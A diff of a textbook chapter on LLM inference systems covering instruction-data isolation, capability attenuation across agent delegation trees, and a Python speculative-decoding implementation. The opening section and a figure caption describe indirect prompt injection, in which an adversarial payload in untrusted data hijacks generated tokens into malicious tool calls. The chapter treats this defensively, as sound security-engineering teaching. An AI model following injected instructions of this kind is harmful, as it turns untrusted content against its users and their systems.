+None of these approaches achieves the unconditional, hardware-enforced separation that MMU-based $W \oplus X$ provides for general-purpose processors. The fundamental difficulty is that the transformer attention mechanism is a dense bilinear operator over the entire context. Crucially, even when an asymmetric mask structurally forbids data tokens from attending to instruction tokens ($\mathbf{M}_{\text{data} \to \text{inst}} = 0$), *newly generated completion tokens* ($pos_{\text{gen}} > pos_{\text{data}}$) must attend to the untrusted data segment to extract facts, parse fields, or synthesize tool calls. The moment generated tokens attend to an adversarial payload embedded in the data segment, the injection directly steers the hidden states and logit projections of the model, tricking it into emitting malicious action invocations. Attention masking alone cannot prevent generation-time semantic hijacking. Consequently, robust systems security must be enforced structurally at the agent orchestration boundary via monotonic capability attenuation across delegation trees, as diagrammed in @fig-vol3-processor-capability-attenuation.
 
 ::: {#fig-vol3-processor-capability-attenuation fig-env="figure" fig-pos="htb" fig-cap="**Monotonic Capability Attenuation across Agent Delegation Trees**: Enforcement of the Principle of Least Privilege across hierarchical subagent delegation. Authority narrows strictly monotonically ($\mathcal{C}_{\text{child}} \subset \mathcal{C}_{\text{parent}}$) across accessible tool endpoints, filesystem path scopes, network egress domains, and financial spending budgets. Even if an untrusted web page compromises a leaf research worker via indirect prompt injection, the attack remains cryptographically contained within that subagent's attenuated lease, unable to access filesystem writes or deployment tools." fig-alt="Hierarchical capability delegation tree illustrating monotonic attenuation from Root Supervisor through Child Subagents 1A and 1B down to Grandchild Test Runner, with formal mathematical invariants for monotonicity, quota boundedness, and temporal lifespan."}
 ![](images/svg/capability_attenuation_tree.svg){width="100%"}
 :::
 
-Whether the accuracy-security trade-off can be made acceptable for production agentic systems is an open research problem, and one whose resolution has direct implications for the system contracts examined throughout this chapter.
+Governing the stochastic processor requires both syntactic constraints and structural security bounds: grammar masks enforce valid output schemas, while capability attenuation limits the blast radius of inevitable prompt injections.
+
+However, enforcing these contracts exposes a crippling performance bottleneck. When an agent emits a capability-bounded tool call, the vast majority of generated tokens are rigid, highly predictable schema scaffolding: brackets, field identifiers, and type delimiters. Under the standard autoregressive forward pass characterized in @sec-vol3-processor-analogy, emitting each of these deterministic tokens requires streaming all 140 GB of model weights from HBM at an arithmetic intensity of $\approx 1$ FLOP/byte. The processor spends over 99 percent of its time waiting for memory to emit tokens whose values are virtually certain. To escape this memory-bandwidth wall without sacrificing verification fidelity, we must turn to Speculative Decoding.
+
+::: {#chk-vol3-02-isolation-wx .callout-checkpoint title="Instruction-data isolation and capability attenuation"}
+Before evaluating speculative decoding, test your understanding of prompt security and execution privilege:
+
+- [ ] **Failure of delimiter tokens:** Explain why soft delimiter tokens (e.g., `<system>`, markdown fences) fail to enforce instruction-data isolation when subjected to adversarial out-of-distribution inputs.
+- [ ] **Asymmetric attention limits:** Why does asymmetric attention masking ($\mathbf{M}_{\text{inst} \to \text{data}} = 1, \mathbf{M}_{\text{data} \to \text{inst}} = 0$) fail to protect newly generated completion tokens from semantic hijacking?
+- [ ] **Monotonic capability attenuation:** Prove why capability sets across hierarchical agent delegation must satisfy strict monotonicity ($\mathcal{C}_{\text{child}} \subset \mathcal{C}_{\text{parent}}$) enforced by an out-of-band kernel rather than natural language instructions.
+:::
 
 ## Speculative Decoding for Structured Action Generation {#sec-vol3-processor-speculative-decoding}
 
@@ -463,6 +652,133 @@ $$ {#eq-speedup-factor}
 
 where $c = T_q / T_p$ is the ratio of draft to target model forward-pass latency. For speculation to accelerate serving ($\rho > 1$), the system requires $\mathbb{E}[\tau_{\text{draft}}] > c \cdot K$. For example, if a draft model is ten times faster than the target ($c = 0.1$) with a speculation window of $K = 8$, the threshold is $\mathbb{E}[\tau_{\text{draft}}] > 0.8$ draft tokens, requiring an empirical acceptance rate $\alpha \gtrsim 0.45$. In practice, production deployments target $\alpha > 0.8$ to achieve $\rho \approx 2.5$–$3.0\times$ speedups.
 
+@Fig-vol3-processor-speculative-decoding diagrams this two-tier execution pipeline, highlighting the critical interplay between sequential drafting, batched verification, and KV-cache rollback upon token rejection.
+
+::: {#fig-vol3-processor-speculative-decoding fig-env="figure" fig-pos="htb" fig-cap="**Two-Tier Speculative Decoding: Draft, Parallel Verify, and KV Rollback**: Execution pipeline converting memory-bound single-token decode into batched verification. In Phase 1, a small draft engine $M_q$ generates $K$ speculative tokens in sequence. In Phase 2, the primary target engine $M_p$ scores all $K$ candidates in a single parallel forward pass. In Phase 3, modified rejection sampling evaluates $\alpha_k = \min(1, p_k / q_k)$. Upon the first rejection at $k=3$, the runtime samples a replacement from the normalized residual distribution $p_{\text{res}}$ and rolls back the unverified speculative tail in the physical KV cache." fig-alt="Three-panel diagram detailing sequential draft proposal, parallel target verification with token-by-token acceptance testing, and physical KV-cache truncation with residual sampling upon rejection."}
+
+![](images/svg/speculative_decoding_pipeline.svg){width="100%"}
+
+:::
+
+To demonstrate how the draft-then-verify protocol is implemented in production systems (such as vLLM's speculative decoding backend), @lst-vol3-processor-speculative-decoding implements the complete speculation loop with residual distribution sampling and physical KV-cache truncation.
+
+::: {#lst-vol3-processor-speculative-decoding lst-cap="**Speculative Decoding with Rejection Sampling and KV-Cache Rollback**: Python implementation of the two-tier draft-then-verify execution harness, featuring per-token acceptance testing, residual correction sampling, and KV cache length rollback."}
+```python
+from dataclasses import dataclass
+from typing import Callable, List, Optional, Tuple
+import numpy as np
+
+
+@dataclass
+class SpeculativeRoundResult:
+  accepted_tokens: List[int]
+  acceptance_count: int
+  speculation_window: int
+  residual_sampled: bool
+  kv_cache_length: int
+
+
+class SpeculativeDecoder:
+  """Two-tier draft-then-verify speculative decoding engine with KV-cache rollback."""
+
+  def __init__(
+      self,
+      draft_policy: Callable[[List[int]], np.ndarray],
+      target_policy: Callable[[List[int], List[int]], np.ndarray],
+      speculation_window: int = 4,
+  ):
+    self.draft_policy = draft_policy  # M_q: returns (vocab_size,)
+    self.target_policy = target_policy  # M_p: takes (context, draft_tokens), returns (K+1, vocab_size)
+    self.K = speculation_window
+
+  def decode_round(
+      self,
+      context_tokens: List[int],
+      kv_cache: Optional[np.ndarray] = None,
+  ) -> Tuple[SpeculativeRoundResult, Optional[np.ndarray]]:
+    """Executes a single draft-then-verify speculation round with physical KV cache rollback."""
+    draft_tokens: List[int] = []
+    draft_probs: List[np.ndarray] = []
+    curr_context = list(context_tokens)
+
+    # Phase 1: Draft generation - K sequential forward passes on small model M_q
+    for _ in range(self.K):
+      q_logits = self.draft_policy(curr_context)
+      q_dist = self._softmax(q_logits)
+      sampled_token = int(np.random.choice(len(q_dist), p=q_dist))
+      draft_tokens.append(sampled_token)
+      draft_probs.append(q_dist)
+      curr_context.append(sampled_token)
+
+    # Phase 2: Target verification - single parallel forward pass on M_p
+    # Evaluates context + all K draft tokens simultaneously in batched GEMM
+    target_logits_matrix = self.target_policy(context_tokens, draft_tokens)
+
+    # Phase 3: Token-level rejection sampling loop
+    accepted_tokens: List[int] = []
+    residual_sampled = False
+
+    for k in range(self.K):
+      token_id = draft_tokens[k]
+      p_dist = self._softmax(target_logits_matrix[k])
+      q_dist = draft_probs[k]
+
+      p_k = p_dist[token_id]
+      q_k = q_dist[token_id]
+
+      # Modified rejection sampling condition: alpha = min(1, p_k / q_k)
+      alpha = min(1.0, p_k / max(q_k, 1e-12))
+      u = np.random.uniform(0.0, 1.0)
+
+      if u <= alpha:
+        # Token accepted: commit token and advance
+        accepted_tokens.append(token_id)
+      else:
+        # Token rejected: sample replacement from residual distribution
+        # p_res(v) = norm(max(0, p(v) - q(v)))
+        residual_dist = np.maximum(0.0, p_dist - q_dist)
+        sum_res = np.sum(residual_dist)
+        if sum_res > 1e-12:
+          residual_dist /= sum_res
+        else:
+          residual_dist = p_dist
+        correction_token = int(
+            np.random.choice(len(residual_dist), p=residual_dist)
+        )
+        accepted_tokens.append(correction_token)
+        residual_sampled = True
+        break  # Halts speculation round on first rejection
+
+    # If all K tokens accepted, sample the (K+1)-th bonus token from target model
+    if len(accepted_tokens) == self.K and not residual_sampled:
+      bonus_dist = self._softmax(target_logits_matrix[self.K])
+      bonus_token = int(np.random.choice(len(bonus_dist), p=bonus_dist))
+      accepted_tokens.append(bonus_token)
+
+    # Phase 4: KV-Cache Truncation & Physical Block Table Rollback
+    # In PagedAttention runtimes (e.g., vLLM BlockManager), speculative tail slots
+    # allocated in physical block tables beyond accepted length are unmapped and returned to free pool.
+    committed_length = len(context_tokens) + len(accepted_tokens)
+    committed_kv_cache = None
+    if kv_cache is not None:
+      # Physically roll back cache tensor to truncate unverified speculative entries
+      committed_kv_cache = kv_cache[:, :, :committed_length, :]
+
+    result = SpeculativeRoundResult(
+        accepted_tokens=accepted_tokens,
+        acceptance_count=len(accepted_tokens),
+        speculation_window=self.K,
+        residual_sampled=residual_sampled,
+        kv_cache_length=committed_length,
+    )
+    return result, committed_kv_cache
+
+  def _softmax(self, logits: np.ndarray) -> np.ndarray:
+    exps = np.exp(logits - np.max(logits))
+    return exps / np.sum(exps)
+```
+:::
+
 ### Why structured outputs exhibit high acceptance rates
 
 The central empirical observation motivating the application of speculative decoding to agentic workloads is that structured output formats—JSON schemas, Python function signatures, SQL queries, and XML tool envelopes—exhibit per-token acceptance rates $\alpha > 0.8$ under virtually any competent draft model. The mechanism is informational: structured outputs are low-entropy continuations.
@@ -501,7 +817,7 @@ $$
 B^* \approx \frac{T_p^{\text{mem}}}{T_p^{\text{comp}}} \cdot \frac{\mathbb{E}[N_{\text{total}}]}{K + 1}
 $$ {#eq-crossover-batch}
 
-where $T_p^{\text{mem}}$ and $T_p^{\text{comp}}$ are the memory-bound and compute-bound per-token latencies of the target model, respectively. For the H100 SXM5 with 3.35 TB/s bandwidth and 989 TFLOPS BF16 throughput, $T_p^{\text{mem}} / T_p^{\text{comp}} \approx 40$ at 70B scale, placing $B^*$ in the range of 16–24 for typical $K = 8$ speculation windows. Serving systems must therefore route single-agent sessions to speculative decoding pipelines and aggregate high-concurrency batch workloads to standard autoregressive pipelines, using dynamic admission control based on the observed request queue depth.
+where $T_p^{\text{mem}}$ and $T_p^{\text{comp}}$ are the memory-bound and compute-bound per-token latencies of the target model, respectively. For an 8-GPU Tensor Parallel cluster ($TP = 8$) of NVIDIA H100 SXM5 accelerators (each with 3.35 TB/s HBM3 bandwidth and 989 TFLOPS BF16 tensor throughput), model weights are sharded across devices ($17.5\text{ GB}$ per GPU) and inter-GPU all-reduce communication shifts the roofline knee, yielding an effective ratio $T_p^{\text{mem}} / T_p^{\text{comp}} \approx 40$ at 70B scale. (On a single hypothetical GPU without communication overhead, the raw roofline ratio is $140\text{ GB} / 3.35\text{ TB/s} \approx 41.8\text{ ms}$ over $140\text{ GFLOPs} / 989\text{ TFLOP/s} \approx 0.141\text{ ms}$, or $\sim 295$). In production $TP=8$ serving deployments, this places $B^*$ in the range of 16–24 for typical $K = 8$ speculation windows. Serving systems must therefore route single-agent sessions to speculative decoding pipelines and aggregate high-concurrency batch workloads to standard autoregressive pipelines, using dynamic admission control based on the observed request queue depth.
 
 ::: {.callout-note title="Structural acceptance rates are workload-specific"}
 The acceptance rate $\alpha$ is not a property of the draft model alone; it is jointly determined by the draft model, the target model, and the token distribution of the workload. A draft model calibrated on code generation may achieve $\alpha = 0.88$ on Python tool calls and $\alpha = 0.61$ on free-form chain-of-thought reasoning within the same agentic session. Production serving systems that apply a fixed speculation window $K$ to all generation phases will observe mean $\alpha$ substantially below the structured-output peak, eroding the latency benefits derived from @eq-speedup-factor. Adaptive speculation—dynamically adjusting $K$ based on a classifier that detects whether the current generation phase is schema-constrained—recovers 60 to 80 percent of the peak benefit on mixed workloads.
@@ -513,15 +829,17 @@ When a draft token is rejected at position $k < K$, the KV cache entries compute
 
 The interaction between speculative decoding and structured output enforcement defines a high-value operating point for agentic inference: the structural predictability of tool-call schemas drives $\alpha$ toward its practical ceiling, the bursty low-concurrency nature of agentic sessions keeps batch sizes below $B^*$, and multi-head architectures such as EAGLE eliminate the inter-device communication overhead that would otherwise dominate latency. The net result, under favorable conditions, is a system that emits verified, schema-compliant tool invocations at effective per-token latencies competitive with much smaller models—realizing the throughput of a 7B-class system while preserving the reasoning fidelity of a 70B target.
 
-::: {#chk-vol3-02-speculative-decoding .callout-checkpoint title="Speculative decoding economics and capability attenuation"}
+::: {#chk-vol3-02-speculative-decoding .callout-checkpoint title="Speculative decoding economics and verification limits"}
 
-Before exploring operational fallacies and proceeding to test-time deliberation, verify your understanding of speculative decoding speedups and capability attenuation:
+Before exploring operational fallacies and proceeding to test-time deliberation, verify your understanding of speculative decoding speedups and crossover bounds:
 
-- [ ] **Speedup break-even**: given a draft model with latency ratio $c = T_q / T_p = 0.12$ and speculation lookahead $K = 6$, calculate the minimum expected accepted draft tokens $\mathbb{E}[\tau_{\text{draft}}]$ needed to achieve speedup ($\rho > 1$).
-- [ ] **Structural entropy**: explain why JSON tool invocation prefixes exhibit near-unity acceptance rates ($\alpha > 0.95$) under speculative decoding, whereas free-form chain-of-thought text suffers frequent rejections.
-- [ ] **Monotonic attenuation**: explain why capability attenuation in multi-agent delegation must be mathematically monotonic ($\mathcal{C}_{\text{child}} \subset \mathcal{C}_{\text{parent}}$) rather than relying on prompt-based instructions to child agents.
+- [ ] **Speedup break-even**: Given a draft model with latency ratio $c = T_q / T_p = 0.12$ and speculation lookahead $K = 6$, calculate the minimum expected accepted draft tokens $\mathbb{E}[\tau_{\text{draft}}]$ needed to achieve speedup ($\rho > 1$).
+- [ ] **Structural entropy**: Explain why JSON tool invocation prefixes exhibit near-unity acceptance rates ($\alpha > 0.95$) under speculative decoding, whereas free-form chain-of-thought text suffers frequent rejections.
+- [ ] **Crossover batch size $B^*$:** Derive why the wall-clock speedup of speculative decoding diminishes as concurrent batch size increases, identifying the physical hardware constraint that causes speculation to lose its advantage at high batch loads.
 
 :::
+
+Speculative decoding closes the loop on processor performance, turning the predictability of structured contracts into physical throughput headroom. Yet, orchestrating this multi-tiered machinery—balancing KV cache allocations, managing floating-point reductions, compiling grammar automata, and verifying speculative proposals—tempts systems engineers into dangerous simplifications. When practitioners mistake statistical approximations for deterministic guarantees, production agentic systems fail in subtle, catastrophic ways. To build dependable architectures, we must systematically dissect the core Fallacies and Pitfalls of the Stochastic Processor Contract.
 
 ## Fallacies and Pitfalls {#sec-vol3-processor-fallacies}
 
@@ -640,15 +958,15 @@ Robust execution-layer design requires semantic validators: model-graded output 
 
 ## Summary {#sec-vol3-processor-summary}
 
-The central tension of this chapter resolves into a single engineering discipline: a stochastic transformer layer is not a liability to be apologized for but a physical substrate to be characterized, bounded, and contracted against. Temperature scaling, nucleus sampling, and logit-lens probing are not cosmetic controls—they are the tuning knobs that map a probability simplex onto an engineering reliability envelope, much as clock-gating and voltage guardband map a silicon die onto a thermal design point. KV cache sizing, governed by $2 \cdot L \cdot d_{\text{model}} \cdot S \cdot b_{\text{elem}}$ bytes per request, couples statistical throughput directly to HBM capacity; at 3.35 TB/s of HBM3e bandwidth and a model arithmetic intensity below the roofline knee, memory pressure—not floating-point throughput—determines whether the stochastic processor can sustain a latency service level agreement (SLA) under load. Quantization and speculative decoding shift the operating point along the roofline, trading representational fidelity and verification overhead for throughput headroom. Reliability emerges not from eliminating randomness but from layering deterministic contracts—input sanitization, output grounding, hallucination rate budgets, constitutional rejection filters—over an inherently probabilistic substrate, so that the aggregate system behaves as a dependable instruction-processing unit even when no individual token draw is guaranteed.
+The central tension of this chapter resolves into a single engineering discipline: a stochastic transformer layer is not a liability to be apologized for but a physical substrate to be characterized, bounded, and contracted against. Temperature scaling and nucleus sampling are the tuning knobs that map a probability simplex onto an engineering reliability envelope, much as clock-gating and voltage guardband map a silicon die onto a thermal design point. KV cache sizing, governed by $2 \cdot L \cdot d_{\text{model}} \cdot S \cdot b_{\text{elem}}$ bytes per request, couples statistical throughput directly to HBM capacity; at 3.35 TB/s of HBM3e bandwidth and a model arithmetic intensity below the roofline knee, memory pressure—not floating-point throughput—determines whether the stochastic processor can sustain a latency service level agreement (SLA) under load. Speculative decoding and structured logit masking shift the operating point along the roofline, trading verification overhead for throughput headroom and eliminating syntactic exceptions by construction. Reliability emerges not from eliminating randomness but from layering deterministic contracts—grammar automata, asymmetric attention masks, monotonic capability attenuation, and approximate replay invariants—over an inherently probabilistic substrate, so that the aggregate system behaves as a dependable instruction-processing unit even when no individual token draw is guaranteed.
 
 ::: {.callout-takeaways title="Core systems principles of the stochastic processor contract"}
 
 1. **Probability mass is a hardware resource.** Temperature and top-$p$ nucleus truncation contract the effective vocabulary to a bounded support set, reducing entropy injection per decode step and making downstream output distributions statistically auditable rather than open-ended.
 2. **KV cache capacity is the binding constraint.** At batch sizes beyond a single request, the working-set footprint of the attention cache—not arithmetic throughput—saturates HBM and determines maximum concurrency; arithmetic intensity must remain above the roofline knee ($\approx 200$ to $300$ FLOPs/byte for modern accelerators) to avoid memory-bandwidth stalls.
-3. **Speculative decoding converts latency slack into throughput without altering output distribution.** A draft model proposes $k$ tokens per step; the target model verifies them in one forward pass; the acceptance probability $\alpha$ governs amortized cost, and the distribution over accepted sequences is provably identical to greedy target-model sampling—reliability is preserved, not approximated.
-4. **Hallucination is a calibration failure, not a model failure.** When a model's predicted confidence diverges from its empirical accuracy, output tokens carry misleading reliability signals; calibration curves, temperature post-training, and retrieval-augmented grounding are engineering controls that restore the alignment between stated and actual token-level error rates.
-5. **Deterministic contracts must wrap probabilistic cores.** Constitutional filters, output schema validators, and adversarial-input rejection layers impose deterministic pass/fail boundaries on stochastic outputs; the system SLA is defined at the contract layer, not inside the sampler, which is the only architecture that scales to production under adversarial load.
+3. **Grammar automata eliminate syntactic faults by construction.** Compiling schema grammars into pushdown automata and finite state machines enables sub-millisecond dynamic logit masking ($\hat{z}_i = -\infty$), enforcing byte-level prefix closure and collapsing the error-retry tax to unity without altering model weights.
+4. **Instruction-data isolation requires structural privilege enforcement.** The transformer context is a flat Von Neumann address space with zero native privilege boundaries; delimiter tokens fail under adversarial distribution shifts, requiring asymmetric attention masks and monotonic capability attenuation ($\mathcal{C}_{\text{child}} \subset \mathcal{C}_{\text{parent}}$) to restrict blast radius.
+5. **Speculative decoding monetizes structural predictability.** Schema-constrained tool actions exhibit near-zero structural entropy ($\alpha > 0.85\text{--}0.95$), allowing small draft models or auxiliary heads (Medusa, EAGLE) to break the memory-bandwidth wall and achieve $2.5\times\text{--}3.0\times$ speedups without distribution distortion.
 
 :::
 
